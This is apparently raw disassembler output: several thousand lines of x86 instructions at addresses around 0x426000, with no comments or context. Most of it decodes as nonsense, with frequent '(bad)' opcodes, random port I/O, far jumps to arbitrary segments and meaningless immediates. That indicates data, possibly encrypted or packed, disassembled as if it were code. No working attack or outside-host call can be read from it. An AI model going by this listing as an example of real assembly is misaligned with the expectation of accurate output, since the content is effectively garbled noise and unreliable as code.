  42611a:	shl    DWORD PTR [ecx-0x3b3d921b],1
  426120:	or     eax,0xe74b6b52
  426125:	fistp  WORD PTR ds:[ecx-0x22]
  426129:	(bad)  [ecx-0xb]
  42612c:	mul    DWORD PTR [edi-0x6303f537]
  426132:	out    dx,al
  426133:	data16 daa 
  426135:	mov    ds:0xc0d5e26,eax
  42613a:	loop   0x42617c
  42613c:	cmp    eax,0xfae18791
  426141:	ins    DWORD PTR es:[edi],dx
  426142:	cmp    dh,BYTE PTR [ebx+0x2bfa31ca]
  426148:	lods   al,BYTE PTR ds:[si]
  42614a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42614b:	in     eax,0x4b
  42614d:	sti    
  42614e:	(bad)  
  42614f:	pop    eax
  426150:	or     eax,0xeb1c5beb
  426155:	ds dec ecx
  426157:	cmp    DWORD PTR [ebp+0x38],ebp
  42615a:	xlat   BYTE PTR ds:[ebx]
  42615b:	mov    eax,ds:0x16176615
  426160:	and    DWORD PTR [ecx+0x347f4e7d],0x7af5c435
  42616a:	out    0xec,eax
  42616c:	xchg   DWORD PTR [edi+0x33620ed],eax
  426172:	(bad)  
  426173:	lods   eax,DWORD PTR ds:[esi]
  426174:	push   0x167091cb
  426179:	mov    BYTE PTR [esp+edi*2+0x4b],bh
  42617d:	ret    0xecbc
  426180:	pop    ecx
  426181:	jmp    0x4261bc
  426183:	mov    bl,0x55
  426185:	xor    BYTE PTR [ecx+0x709d8538],cl
  42618b:	sub    BYTE PTR [edi],bh
  42618d:	adc    ebp,edx
  42618f:	cld    
	...
  4261f4:	fwait
  4261f5:	and    DWORD PTR [edi],ecx
  4261f7:	popa   
  4261f8:	mov    edi,0xb7fbff6f
  4261fd:	xor    DWORD PTR [ecx+0x3aca6e27],0xffffffa9
  426204:	in     al,0x96
  426206:	add    DWORD PTR [eax],eax
  426208:	add    al,0x1
  42620a:	add    BYTE PTR [eax],al
  42620c:	mov    bl,0x1d
  42620e:	or     al,0x68
  426210:	sbb    DWORD PTR [edx+0x18],eax
  426213:	jo     0x42624e
  426215:	scas   al,BYTE PTR es:[edi]
  426216:	enter  0x1c6a,0x48
  42621a:	fisttp DWORD PTR [eax+esi*1]
  42621d:	test   eax,0x7886862e
  426222:	xor    BYTE PTR [esi],0x7c
  426225:	xor    ebp,DWORD PTR [ebx+eiz*2+0x57f825d7]
  42622c:	pop    eax
  42622d:	xchg   DWORD PTR [edx],edx
  42622f:	jle    0x426297
  426231:	int    0x1
  426233:	shl    edi,1
  426235:	lods   al,BYTE PTR ds:[esi]
  426236:	sub    eax,0xa2b939d6
  42623b:	sbb    DWORD PTR [edx-0x509ab086],ecx
  426241:	test   BYTE PTR [edx],cl
  426243:	jp     0x4261eb
  426245:	mov    edi,0x4bc3bd82
  42624a:	and    eax,0x880801ae
  42624f:	sbb    dl,BYTE PTR [edx+edx*1]
  426252:	fidiv  DWORD PTR [esi]
  426254:	imul   esi,esi,0x25
  426257:	or     edx,ecx
  426259:	jb     0x426290
  42625b:	cld    
  42625c:	test   DWORD PTR [edi+ecx*8],esi
  42625f:	push   0xce9e558e
  426264:	mov    dh,BYTE PTR [ebp+0x26e124bd]
  42626a:	scas   eax,DWORD PTR es:[edi]
  42626b:	push   ss
  42626c:	imul   edx,ebx,0xd62a176a
  426272:	cdq    
  426273:	inc    edi
  426274:	push   esi
  426275:	imul   ecx,DWORD PTR [ebp+0x39],0xffffffcf
  426279:	test   al,0x83
  42627b:	dec    esi
  42627c:	xlat   BYTE PTR ds:[ebx]
  42627d:	lods   al,BYTE PTR ds:[esi]
  42627e:	stos   DWORD PTR es:[edi],eax
  42627f:	jp     0x4262dc
  426281:	stos   BYTE PTR es:[edi],al
  426282:	fwait
  426283:	(bad)  
  426284:	adc    edi,DWORD PTR [ebx]
  426286:	clc    
  426287:	inc    ebx
  426288:	mov    ebp,0xb78a8930
  42628d:	inc    ebx
  42628e:	inc    edx
  42628f:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  426291:	and    BYTE PTR [ecx+0x7],0x5d
  426295:	and    ebp,eax
  426297:	xor    DWORD PTR ds:[ebp+0x87e0673],ebp
  42629e:	std    
  42629f:	push   es
  4262a0:	clc    
  4262a1:	dec    ebx
  4262a2:	pop    ss
  4262a3:	outs   dx,BYTE PTR ds:[esi]
  4262a4:	xchg   esi,eax
  4262a5:	xor    ecx,DWORD PTR [ecx]
  4262a7:	leave  
  4262a8:	and    eax,0x85562998
  4262ad:	daa    
  4262ae:	xchg   esp,eax
  4262af:	xor    al,0xb4
  4262b1:	ficom  DWORD PTR [esi]
  4262b3:	cmp    BYTE PTR [edx+0x7a8744a5],0x7
  4262ba:	scas   eax,DWORD PTR es:[edi]
  4262bb:	cmp    eax,0x6623eb5a
  4262c0:	sub    eax,0x637f2b7f
  4262c5:	shl    BYTE PTR [ebp+0x7a],1
  4262c8:	fsub   st(3),st
  4262ca:	xor    ebx,DWORD PTR [ebx+ecx*8+0x576ca864]
  4262d1:	jg     0x42628a
  4262d3:	das    
  4262d4:	sbb    al,0xf0
  4262d6:	cmp    DWORD PTR [ebx],edi
  4262d8:	mov    WORD PTR [edi+0x5034fae2],es
  4262de:	lea    edi,ds:0x8d16fb97
  4262e4:	sar    DWORD PTR [esi],1
  4262e6:	mov    ebp,0xb798e84b
  4262eb:	(bad)  
  4262ec:	xor    bh,ah
  4262ee:	(bad)  
  4262ef:	sbb    esp,edi
  4262f1:	loope  0x426323
  4262f3:	les    esi,FWORD PTR [edi]
  4262f5:	out    dx,al
  4262f6:	pop    eax
  4262f7:	xchg   edi,edx
  4262f9:	or     ah,BYTE PTR [ebp-0x44]
  4262fc:	test   esi,ecx
  4262fe:	hlt    
  4262ff:	daa    
  426300:	jo     0x42636f
  426302:	push   ebx
  426303:	iret   
  426304:	ret    0x922a
  426307:	push   eax
  426308:	dec    ebp
  426309:	call   0xf7cc0805
  42630e:	dec    edi
  42630f:	cmp    al,BYTE PTR [eax]
	...
  426371:	add    BYTE PTR [eax],al
  426373:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  426377:	dec    esi
  426378:	std    
  426379:	out    dx,al
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0x784ced92
  426384:	call   0x4426520
  426389:	add    DWORD PTR [eax],eax
  42638b:	add    BYTE PTR [ebx],ah
  42638d:	mov    ebp,0xcc766e71
  426392:	jl     0x426394
  426394:	or     ebx,ecx
  426396:	jmp    0xac2:0x6ccd1352
  42639d:	mov    esi,0xfb17b89c
  4263a2:	xchg   DWORD PTR [edi-0x48080589],ecx
  4263a8:	in     eax,dx
  4263a9:	or     bl,BYTE PTR [edi]
  4263ab:	out    0x2b,al
  4263ad:	mov    bh,0xf
  4263af:	gs out dx,eax
  4263b1:	mov    ds:0xe29703c8,eax
  4263b6:	mov    al,0x67
  4263b8:	sub    al,0xa2
  4263ba:	and    dh,BYTE PTR [edi]
  4263bc:	or     eax,DWORD PTR [ebx+0x62]
  4263bf:	loop   0x426368
  4263c1:	xchg   ebx,eax
  4263c2:	cmp    ebp,ebp
  4263c4:	dec    ecx
  4263c5:	inc    edi
  4263c6:	dec    ebp
  4263c7:	int    0xe2
  4263c9:	lahf   
  4263ca:	ja     0x4263c1
  4263cc:	add    esp,edx
  4263ce:	retf   
  4263cf:	jge    0x4263a7
  4263d1:	inc    esi
  4263d2:	retf   0x30ef
  4263d5:	cmp    bh,cl
  4263d7:	xchg   BYTE PTR [ecx],ch
  4263d9:	mov    al,ds:0x4b7d7477
  4263de:	mov    esi,0x46dcb983
  4263e3:	fs jmp 0x426371
  4263e6:	xor    ebx,DWORD PTR [ecx+edx*2-0x18]
  4263ea:	js     0x42639e
  4263ec:	mov    eax,0xf9b3cdde
  4263f1:	cmp    eax,0x56c94749
  4263f6:	repnz mov al,0xc8
  4263f9:	repz jp 0x42642a
  4263fc:	outs   dx,DWORD PTR ds:[esi]
  4263fd:	mov    eax,0xc8b2f7ef
  426402:	pop    esi
  426403:	mov    ebx,0xa9d100d9
  426408:	nop
  426409:	xor    DWORD PTR [edi+0x4a],esi
  42640c:	ss dec edi
  42640e:	mov    eax,ds:0xa41785ab
  426413:	fist   WORD PTR [ecx]
  426415:	xchg   DWORD PTR [ebx],eax
  426417:	and    eax,0xb34ffd87
  42641c:	test   eax,0x78f54274
  426421:	mov    eax,ds:0x4ca34033
  426426:	xor    dh,BYTE PTR [ecx-0x3a461763]
  42642c:	add    al,0x46
  42642e:	jo     0x4263b9
  426430:	cmp    al,0xd7
  426432:	xchg   edx,eax
  426433:	xor    dh,BYTE PTR [ecx-0x19]
  426436:	arpl   WORD PTR [edi-0x37d0208b],dx
  42643c:	test   BYTE PTR [edi+0x37],al
  42643f:	inc    ebp
  426440:	inc    ebx
  426441:	rcr    BYTE PTR [edx-0x39],0x4c
  426445:	sti    
  426446:	inc    esp
  426447:	shl    BYTE PTR [edx],0x16
  42644a:	lahf   
  42644b:	sub    BYTE PTR [ebp-0x7c],ch
  42644e:	mov    eax,0x3a06497f
  426453:	xchg   esi,eax
  426454:	jg     0x426436
  426456:	adc    ah,dh
  426458:	adc    sp,sp
  42645b:	mov    bh,0xfa
  42645d:	mov    edi,0x3ca35bd8
  426462:	popf   
  426463:	ffree  st(0)
  426465:	inc    ecx
  426466:	push   ecx
  426467:	mul    DWORD PTR [edx-0x37]
  42646a:	and    edx,DWORD PTR [eax+0xa4ae14d]
  426470:	test   DWORD PTR [ecx-0x78],ebx
  426473:	std    
  426474:	test   DWORD PTR [edx-0x64],esi
  426477:	dec    eax
  426478:	or     eax,ebx
  42647a:	lock xor esi,DWORD PTR [ebp-0x9]
  42647e:	pop    esp
  42647f:	mov    ah,0xc3
  426481:	ficomp WORD PTR [ebx+0x2c]
  426484:	jl     0x4264cb
  426486:	and    ah,BYTE PTR [ebp-0x3559a114]
  42648c:	pushf  
  42648d:	shr    DWORD PTR [edi-0x49],cl
	...
  4264f4:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  4264fb:	outs   dx,DWORD PTR ds:[esi]
  4264fc:	vmwrite ecx,DWORD PTR [edx-0x4ff9347b]
  426503:	int3   
  426504:	in     al,dx
  426505:	cwde   
  426506:	add    DWORD PTR [eax],eax
  426508:	add    al,0x1
  42650a:	add    BYTE PTR [eax],al
  42650c:	loopne 0x42658b
  42650e:	cmp    DWORD PTR [eax],ebx
  426510:	cwde   
  426511:	retf   0xad9a
  426514:	ret    0xe856
  426517:	lods   eax,DWORD PTR ds:[esi]
  426518:	and    DWORD PTR [ebx],esi
  42651a:	lea    edx,[ecx+0x1b32c0a7]
  426520:	test   eax,0x5f563523
  426525:	ins    DWORD PTR es:[edi],dx
  426526:	leave  
  426527:	dec    esi
  426528:	push   eax
  426529:	das    
  42652a:	lods   eax,DWORD PTR ds:[esi]
  42652b:	xchg   DWORD PTR [esp+eax*1+0x4a],esi
  42652f:	sub    bh,bh
  426531:	sbb    dh,BYTE PTR [edi-0x63]
  426534:	dec    ecx
  426535:	inc    ebp
  426536:	xor    eax,0xdb8bdae5
  42653b:	dec    eax
  42653c:	cdq    
  42653d:	xchg   esi,eax
  42653e:	sbb    BYTE PTR [esi],bh
  426540:	scas   eax,DWORD PTR es:[edi]
  426541:	sbb    BYTE PTR [ecx+0x43ea852c],0xa0
  426548:	inc    edi
  426549:	mov    ebx,0xbd8e3054
  42654e:	mov    ds:0x68204215,al
  426553:	push   esi
  426555:	jbe    0x426539
  426557:	aad    0xb8
  426559:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42655a:	gs or  al,0x30
  42655d:	adc    al,0x73
  42655f:	nop
  426560:	ja     0x42655e
  426562:	jb     0x4265af
  426564:	lods   eax,DWORD PTR ds:[esi]
  426565:	call   0x2ab6ea7b
  42656a:	and    al,0x4d
  42656c:	ficom  DWORD PTR [esi]
  42656e:	loope  0x426513
  426570:	jo     0x4265a4
  426572:	xchg   esp,eax
  426573:	retf   0x9dfe
  426576:	cmp    al,0xe0
  426578:	dec    esi
  426579:	mov    cs,WORD PTR [edx]
  42657b:	add    ebx,DWORD PTR [ecx]
  42657d:	add    esp,DWORD PTR [ebp-0x4888c92]
  426583:	pop    ss
  426584:	mov    dh,0x84
  426586:	xchg   edx,eax
  426587:	fs xor eax,0xd66d3d81
  42658d:	inc    edi
  42658e:	dec    edx
  42658f:	sbb    DWORD PTR [esi+0x54],edi
  426592:	pushf  
  426593:	mov    al,bl
  426595:	fwait
  426596:	and    ebx,DWORD PTR ds:0x9934279f
  42659c:	xchg   ecx,eax
  42659d:	fsub   st,st(5)
  42659f:	(bad)  
  4265a1:	mov    dl,dh
  4265a3:	jge    0x42659b
  4265a5:	pop    es
  4265a6:	imul   esp,edi,0x5f
  4265a9:	out    0x86,eax
  4265ab:	in     eax,dx
  4265ac:	sub    DWORD PTR [eax-0x57],esi
  4265af:	adc    eax,0xd521f9e2
  4265b4:	lods   al,BYTE PTR ds:[esi]
  4265b5:	in     eax,dx
  4265b6:	std    
  4265b7:	jmp    0x31d8fdaa
  4265bc:	mov    eax,ds:0x28cf15e2
  4265c1:	xchg   edi,eax
  4265c2:	mov    eax,DWORD PTR [esi-0x6]
  4265c5:	xrelease xchg BYTE PTR [ecx+0x4d],ah
  4265c9:	sbb    BYTE PTR [ebp-0xf],dl
  4265cc:	xor    eax,0xdf298eb5
  4265d1:	scas   al,BYTE PTR es:[edi]
  4265d2:	in     al,dx
  4265d3:	icebp  
  4265d4:	adc    ebp,DWORD PTR [ebp+0x58]
  4265d7:	dec    edi
  4265d8:	mov    ebp,ebp
  4265da:	cmc    
  4265db:	sar    edi,1
  4265dd:	aad    0x52
  4265df:	xor    eax,0x1cc501c5
  4265e4:	and    dl,BYTE PTR [edi+0x70]
  4265e7:	sahf   
  4265e8:	push   edx
  4265e9:	int    0x18
  4265eb:	fisttp QWORD PTR [edi+0x3c]
  4265ee:	jmp    0x4b56:0x508c4926
  4265f5:	scas   al,BYTE PTR es:[edi]
  4265f6:	arpl   WORD PTR [ecx-0x2809c288],cx
  4265fc:	ret    0x8758
  4265ff:	dec    ebx
  426600:	inc    ecx
  426601:	dec    ebx
  426602:	push   ds
  426603:	xor    DWORD PTR [ebp+eax*1+0x4755d8ae],ebx
  42660a:	sub    edx,ebx
  42660c:	inc    ecx
  42660d:	rol    ch,0xd8
	...
  426674:	adc    cl,bl
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi-0x24c0925c]
  426682:	clc    
  426683:	(bad)  
  426685:	cdq    
  426686:	add    DWORD PTR [eax],eax
  426688:	add    al,0x1
  42668a:	add    BYTE PTR [eax],al
  42668c:	add    al,0xc
  42668e:	popf   
  42668f:	psubusw mm0,QWORD PTR [eax+0x2b]
  426693:	pusha  
  426694:	fld    QWORD PTR [edx-0x5a1053bd]
  42669a:	adc    esi,esi
  42669c:	jne    0x42670f
  42669e:	ret    0xce45
  4266a1:	dec    edi
  4266a2:	imul   eax,ecx,0xffffffd0
  4266a5:	add    eax,0xe0d33015
  4266aa:	push   ss
  4266ab:	mov    ch,0x4
  4266ad:	pusha  
  4266ae:	pusha  
  4266af:	jmp    FWORD PTR [ecx]
  4266b1:	sub    dh,BYTE PTR [ebp+0x56109f79]
  4266b7:	rcr    BYTE PTR ds:0x5a28739f,1
  4266bd:	push   esp
  4266be:	retf   
  4266bf:	inc    ecx
  4266c0:	adc    DWORD PTR [ebx],esp
  4266c2:	add    al,BYTE PTR [edi-0x4a154242]
  4266c8:	bound  ecx,QWORD PTR [eax-0x3390ff04]
  4266ce:	leave  
  4266cf:	lds    esp,FWORD PTR [eax]
  4266d1:	icebp  
  4266d2:	jbe    0x426715
  4266d4:	and    al,0xd0
  4266d6:	repz mov bl,0xb4
  4266d9:	test   al,0x4d
  4266db:	test   al,0x47
  4266dd:	xchg   BYTE PTR [esi-0x31],dl
  4266e0:	or     ah,BYTE PTR [edx+0x7381a1c1]
  4266e6:	mov    bl,bl
  4266e8:	jmp    0x4266f2
  4266ea:	call   0x9d91:0x202bbb4
  4266f1:	(bad)  
  4266f2:	outs   dx,DWORD PTR ds:[esi]
  4266f3:	int3   
  4266f4:	dec    ebp
  4266f5:	repnz mov esp,0x31892784
  4266fb:	adc    DWORD PTR ds:0x8e159d86,edi
  426701:	(bad)  
  426702:	pop    ebx
  426703:	mul    DWORD PTR [ebp-0x23cda3a8]
  426709:	not    DWORD PTR [eiz*1-0x38b7df67]
  426710:	pop    es
  426711:	dec    ecx
  426712:	imul   ebp,DWORD PTR [eax+esi*2+0x58aec8a],0xf
  42671a:	aam    0xe8
  42671c:	daa    
  42671d:	xchg   ch,dl
  42671f:	push   ss
  426720:	inc    ebp
  426721:	mov    eax,0x9452a1f2
  426726:	inc    eax
  426727:	fidivr WORD PTR [edi-0x6e]
  42672a:	ror    BYTE PTR [ecx],0x6e
  42672d:	fs xor bh,ah
  426730:	es popa 
  426732:	shufps xmm3,XMMWORD PTR [ecx-0x1b1d7f2e],0xa
  42673a:	push   ebx
  42673b:	in     eax,dx
  42673c:	(bad)  
  42673d:	mov    dh,0x7b
  42673f:	pop    ebp
  426740:	mov    ah,0xcd
  426742:	retf   0x52ad
  426745:	pushf  
  426746:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426747:	xor    BYTE PTR [edi+0x2bed8735],ah
  42674d:	dec    eax
  42674e:	lahf   
  42674f:	rcl    ebx,cl
  426751:	rol    DWORD PTR ds:0x289bf957,0x96
  426758:	mov    edx,0x10410a2
  42675d:	pmulhw mm3,QWORD PTR [esi-0x22]
  426761:	jge    0x426766
  426763:	or     al,0x33
  426765:	push   esp
  426766:	and    al,0x85
  426768:	lods   al,BYTE PTR ds:[esi]
  426769:	push   eax
  42676a:	js     0x4266f5
  42676c:	add    DWORD PTR [edx-0x46],eax
  42676f:	idiv   edi
  426771:	and    al,0x1d
  426773:	dec    eax
  426774:	fsub   st(2),st
  426776:	add    eax,0x45c97d68
  42677b:	dec    ebp
  42677c:	maxps  xmm3,XMMWORD PTR [eax+0xd]
  426780:	retf   0x348b
  426783:	jb     0x42672d
  426785:	xchg   ecx,eax
  426786:	in     al,0xf3
  426788:	addr16 mov ebp,0xbf08c06d
  42678e:	push   eax
  42678f:	add    DWORD PTR [eax],0x0
	...
  4267f2:	add    BYTE PTR [eax],al
  4267f4:	mov    eax,0xff2ace8d
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	and    eax,0xf450cbb7
  426805:	call   0x0:0x1040001
  42680c:	sahf   
  42680d:	dec    ebx
  42680e:	adc    BYTE PTR [ecx],bh
  426810:	jnp    0x4267da
  426812:	das    
  426813:	mov    al,0xbd
  426815:	mov    DWORD PTR [ebp+0x4f417040],esp
  42681b:	loopne 0x4267ad
  42681d:	sbb    edi,DWORD PTR [edi+0xb]
  426820:	into   
  426821:	adc    al,0x61
  426823:	bound  edx,QWORD PTR [esi]
  426825:	(bad)  
  426826:	push   cs
  426827:	jb     0x4267bc
  426829:	pop    eax
  42682a:	shr    BYTE PTR [esi-0x17],0xed
  42682e:	call   0xeb23:0x76e683a0
  426835:	jno    0x42687b
  426837:	call   0xfa5405ea
  42683c:	test   eax,0x4f93177d
  426841:	mov    dh,0x89
  426843:	xchg   esp,eax
  426844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426845:	pushf  
  426846:	scas   al,BYTE PTR es:[edi]
  426847:	inc    ebx
  426848:	ror    DWORD PTR [ebp+eax*4-0x52],cl
  42684c:	jmp    0x121d3d7f
  426851:	addr16 or ecx,ebp
  426854:	aas    
  426855:	dec    ecx
  426856:	cmp    BYTE PTR es:[edi+ebp*4+0x7c7c88fd],bl
  42685e:	pop    es
  42685f:	pop    edx
  426860:	xor    cl,BYTE PTR [eax]
  426862:	dec    DWORD PTR [ebp-0x4]
  426865:	mov    ecx,0x1f8bfc1
  42686a:	cmp    edx,esp
  42686c:	mov    edi,DWORD PTR [edi]
  42686e:	push   esp
  42686f:	sub    eax,0xc7e9b042
  426874:	lods   eax,DWORD PTR ds:[esi]
  426875:	jne    0x426860
  426877:	xlat   BYTE PTR ds:[ebx]
  426878:	(bad)  
  426879:	mov    ebx,0xefc0b5a8
  42687e:	mov    bh,0x20
  426880:	jl     0x4268c7
  426882:	push   esp
  426883:	les    eax,FWORD PTR ds:0xa0ab043e
  426889:	retf   
  42688a:	jb     0x426820
  42688c:	inc    ebx
  42688d:	stos   BYTE PTR es:[edi],al
  42688e:	std    
  42688f:	and    al,0x30
  426891:	sar    BYTE PTR [ebx-0x703bf933],1
  426897:	repnz or eax,0x30c55c82
  42689d:	arpl   dx,dx
  42689f:	jnp    0x426906
  4268a1:	pop    esp
  4268a2:	dec    ebp
  4268a3:	push   0x29
  4268a5:	ins    BYTE PTR es:[edi],dx
  4268a6:	sbb    ebp,eax
  4268a8:	dec    esi
  4268a9:	sub    ecx,DWORD PTR [ebp-0x1a]
  4268ac:	mov    DWORD PTR [ebx+0x49],ecx
  4268af:	enter  0xc35c,0x9d
  4268b3:	retf   0xed88
  4268b6:	push   cs
  4268b7:	mov    esp,0xe756551b
  4268bc:	jo     0x42692c
  4268be:	mov    ah,0x7d
  4268c0:	cld    
  4268c1:	sbb    bh,dh
  4268c3:	pop    edx
  4268c4:	push   esp
  4268c5:	sti    
  4268c6:	stos   DWORD PTR es:[edi],eax
  4268c7:	xchg   ebp,eax
  4268c8:	ins    DWORD PTR es:[edi],dx
  4268c9:	mov    edx,0xb7c64397
  4268ce:	xor    BYTE PTR [ebp-0x35f22855],bh
  4268d4:	push   edx
  4268d5:	ret    
  4268d6:	test   BYTE PTR [edi],bl
  4268d8:	push   ds
  4268d9:	(bad)  
  4268da:	push   esi
  4268db:	dec    edx
  4268dc:	pop    edx
  4268dd:	inc    ebx
  4268de:	sbb    ecx,ebx
  4268e0:	push   eax
  4268e1:	mov    ds:0x13d07ef9,eax
  4268e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268e7:	stc    
  4268e8:	dec    dh
  4268ea:	pop    edx
  4268eb:	test   al,0xa6
  4268ed:	dec    ebp
  4268ee:	xchg   BYTE PTR [edx+0x52733a33],al
  4268f4:	mov    eax,0x21ecf027
  4268f9:	dec    ebp
  4268fa:	out    0x5a,al
  4268fc:	dec    esp
  4268fd:	xlat   BYTE PTR ds:[ebx]
  4268fe:	push   0xffffffd8
  426900:	cdq    
  426901:	je     0x426966
  426903:	int    0xe3
  426905:	icebp  
  426906:	dec    ecx
  426907:	dec    esp
  426908:	cmc    
  426909:	(bad)  ds:0x60928f8e
  42690f:	outs   dx,DWORD PTR ds:[esi]
	...
  426974:	mov    WORD PTR [esi+0x7d],cs
  426977:	jge    0x426978
  426979:	jg     0x426907
  42697b:	jmp    FWORD PTR [ebx]
  42697d:	in     al,dx
  42697e:	lahf   
  42697f:	mov    ebp,DWORD PTR [ebp+0x5e]
  426982:	ss (bad) 
  426984:	clc    
  426985:	fwait
  426986:	add    DWORD PTR [eax],eax
  426988:	add    al,0x1
  42698a:	add    BYTE PTR [eax],al
  42698c:	sbb    DWORD PTR [edi-0x4423182b],ebx
  426992:	in     al,0x39
  426994:	adc    BYTE PTR [edi+0x788ea1a8],bl
  42699a:	adc    DWORD PTR [ebp-0x38022d76],0x386a0e60
  4269a4:	fisub  DWORD PTR ds:0xaf961d3c
  4269aa:	enter  0x1d9,0xa2
  4269ae:	sbb    ebx,DWORD PTR [ebp+0x76]
  4269b1:	mov    esp,0x5b53a943
  4269b6:	sahf   
  4269b7:	pop    ds
  4269b8:	or     DWORD PTR [esi-0x4ed9b358],edi
  4269be:	stc    
  4269bf:	jge    0x426945
  4269c1:	(bad)  
  4269c2:	sahf   
  4269c3:	push   ds
  4269c4:	jae    0x426a27
  4269c6:	cwde   
  4269c7:	mov    cl,al
  4269c9:	(bad)  
  4269ca:	pop    ss
  4269cb:	mov    ebx,0xa00a7528
  4269d0:	pusha  
  4269d1:	adc    eax,0xd87c92cc
  4269d6:	xor    eax,0x5e8355b4
  4269db:	pushf  
  4269dc:	adc    edi,DWORD PTR [ebx+0x2b]
  4269df:	pop    es
  4269e0:	mov    ds:0x67f65959,eax
  4269e5:	push   esi
  4269e6:	dec    edx
  4269e7:	cmp    al,0x88
  4269e9:	add    eax,0x2c8f86b
  4269ee:	cmp    ecx,DWORD PTR [ebx+0x46b27888]
  4269f4:	mov    ecx,DWORD PTR [edi]
  4269f6:	xor    edx,DWORD PTR [edx-0x2e1f89f9]
  4269fc:	push   0xb226c90
  426a01:	add    DWORD PTR [ecx],esp
  426a03:	xor    eax,ecx
  426a05:	push   ecx
  426a06:	outs   dx,DWORD PTR ds:[esi]
  426a07:	repz test BYTE PTR [ebx+0x48],bh
  426a0b:	stc    
  426a0c:	xchg   DWORD PTR [ecx+0x16],edx
  426a0f:	ja     0x4269ec
  426a11:	adc    DWORD PTR [ebp+0x6f],0xffffffbc
  426a15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a16:	inc    ecx
  426a17:	pop    ecx
  426a18:	loopne 0x426a6a
  426a1a:	aad    0xe6
  426a1c:	fst    QWORD PTR [edi-0x59]
  426a1f:	int3   
  426a20:	jnp    0x426a18
  426a22:	stos   DWORD PTR es:[edi],eax
  426a23:	add    al,0x4b
  426a25:	cdq    
  426a26:	xchg   esp,eax
  426a27:	xchg   ecx,eax
  426a28:	sub    DWORD PTR [ecx+0x53],eax
  426a2b:	and    DWORD PTR [eax-0x61c48114],0x1e
  426a32:	fnstenv [ebp+0x639f5c95]
  426a38:	xor    al,0x52
  426a3a:	int    0x73
  426a3c:	inc    esp
  426a3d:	xchg   DWORD PTR [eax+0x0],esp
  426a40:	popf   
  426a41:	xchg   esp,eax
  426a42:	dec    ecx
  426a43:	jle    0x426a94
  426a45:	hlt    
  426a46:	inc    esp
  426a47:	aam    0x26
  426a49:	sub    DWORD PTR [ecx+esi*8+0x7d0bcc59],ebp
  426a50:	test   al,0x26
  426a52:	mov    cl,0xe5
  426a54:	(bad)  
  426a55:	xchg   esi,eax
  426a56:	daa    
  426a57:	dec    ecx
  426a58:	add    ch,dh
  426a5a:	xor    esp,DWORD PTR [esi+0x70]
  426a5d:	je     0x4269e1
  426a5f:	add    ch,BYTE PTR [ebx-0x7c]
  426a62:	add    bh,BYTE PTR [edx-0x49]
  426a65:	xchg   edx,eax
  426a66:	repnz sbb eax,0xf4f9de61
  426a6c:	lods   al,BYTE PTR ds:[esi]
  426a6d:	(bad)  
  426a6e:	xlat   BYTE PTR ds:[ebx]
  426a6f:	adc    eax,0xda4f86d
  426a74:	and    DWORD PTR [edx],ebx
  426a76:	sub    eax,0xe6a454a
  426a7b:	lds    ecx,FWORD PTR [ebx-0x123a9313]
  426a81:	pop    ebp
  426a82:	jp     0x426aed
  426a84:	ret    
  426a85:	add    dl,BYTE PTR cs:[edx+0x35]
  426a89:	test   DWORD PTR [ecx-0x22],edi
  426a8c:	fnstsw WORD PTR [esi]
  426a8e:	sub    BYTE PTR [esi],ah
	...
  426af4:	cdq    
  426af5:	sub    BYTE PTR ds:0xdb77bd56,cl
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0x13
  426b01:	out    dx,eax
  426b02:	push   ebx
  426b03:	pusha  
  426b04:	cld    
  426b05:	pushf  
  426b06:	add    DWORD PTR [eax],eax
  426b08:	add    al,0x1
  426b0a:	add    BYTE PTR [eax],al
  426b0c:	or     bl,bl
  426b0e:	xchg   edi,eax
  426b0f:	inc    ecx
  426b10:	(bad)  
  426b11:	xlat   BYTE PTR ds:[ebx]
  426b12:	add    eax,0x8e232894
  426b17:	pop    ebx
  426b18:	jl     0x426b29
  426b1a:	arpl   WORD PTR [ebp-0x4ff85a2a],bx
  426b20:	aad    0x1d
  426b22:	mov    ch,0x6f
  426b24:	sub    eax,0xef629b7f
  426b29:	in     al,0x41
  426b2b:	scas   eax,DWORD PTR es:[edi]
  426b2c:	je     0x426b04
  426b2e:	cs inc ebp
  426b30:	int3   
  426b31:	dec    ebx
  426b32:	retf   0xe8bb
  426b35:	popf   
  426b36:	(bad)  
  426b37:	neg    DWORD PTR [ecx+eiz*1]
  426b3a:	pop    ebx
  426b3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b3c:	push   es
  426b3d:	test   edx,esp
  426b3f:	leave  
  426b40:	outs   dx,BYTE PTR ds:[esi]
  426b41:	jg     0x426b73
  426b43:	test   al,0xcf
  426b45:	loop   0x426add
  426b47:	adc    esi,0x19ab17ee
  426b4d:	(bad)
  426b51:	or     al,BYTE PTR [ebp-0x87ffcf7]
  426b57:	cli    
  426b58:	mov    esi,0x5f487968
  426b5d:	xchg   ebx,eax
  426b5e:	stos   DWORD PTR es:[edi],eax
  426b5f:	xchg   edi,eax
  426b60:	mov    ah,0x34
  426b62:	mov    esp,0x6d3b1aa8
  426b67:	test   al,0xa8
  426b69:	push   edx
  426b6a:	(bad)  
  426b6b:	jmp    0x222c1168
  426b70:	leave  
  426b71:	cmp    eax,DWORD PTR [ebx]
  426b73:	jne    0x426b65
  426b75:	mov    eax,ds:0x8654da22
  426b7a:	or     al,BYTE PTR [ebx+ecx*8-0x45a30407]
  426b81:	ja     0x426b80
  426b83:	inc    ecx
  426b84:	cmp    al,0x5f
  426b86:	inc    ebx
  426b87:	and    cl,BYTE PTR [ebx]
  426b89:	es cli 
  426b8b:	mov    ebx,0x1c6fe58e
  426b90:	inc    ebp
  426b91:	inc    ebp
  426b92:	nop
